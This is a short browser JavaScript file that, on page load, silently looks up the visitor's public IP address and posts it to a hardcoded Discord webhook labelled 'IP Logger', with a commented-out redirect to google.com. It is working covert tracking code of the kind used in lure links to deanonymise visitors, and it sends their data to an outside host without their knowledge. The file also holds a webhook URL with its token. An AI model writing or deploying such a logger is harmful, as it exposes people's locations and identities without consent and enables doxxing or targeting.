async function getIP() {
    try {
        // Use a reliable service to get the IP
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        // Return a specific error message if the fetch fails
        return 'Error: Could not fetch IP';
    }
}

async function sendToWebhook(ip) {
    const webhookUrl = 'https://discord.com/api/webhooks/1444881923909619712/rrsDVZbrvQxBYnNPrsWP2wLBpAOxZxvi4QTwDIoJyof_bZWP-TrO_so9z0ehii2qSIUP';

    // Construct the content string explicitly.
    // This resolves the issue of the template literal not being parsed.
    const messageContent = "New user IP: " + ip;

    const payload = {
        content: messageContent,
        username: 'IP Logger',
        avatar_url: 'https://i.imgur.com/4M34hi2.png' // Optional avatar
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        // Check if the request was successful
        if (!response.ok) {
            // Log the full error for better debugging
            const errorText = await response.text();
            console.error('Webhook response error:', response.status, response.statusText, errorText);
        } else {
            console.log('IP sent successfully to Discord.');
        }
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

// This function runs when the page is fully loaded
window.onload = async () => {
    const ip = await getIP();
    await sendToWebhook(ip);
    
    // Optional: Redirect the user after a short delay to ensure the request completes
    setTimeout(() => {
        // window.location.href = 'https://google.com';
    }, 1000); // 1-second delay
};
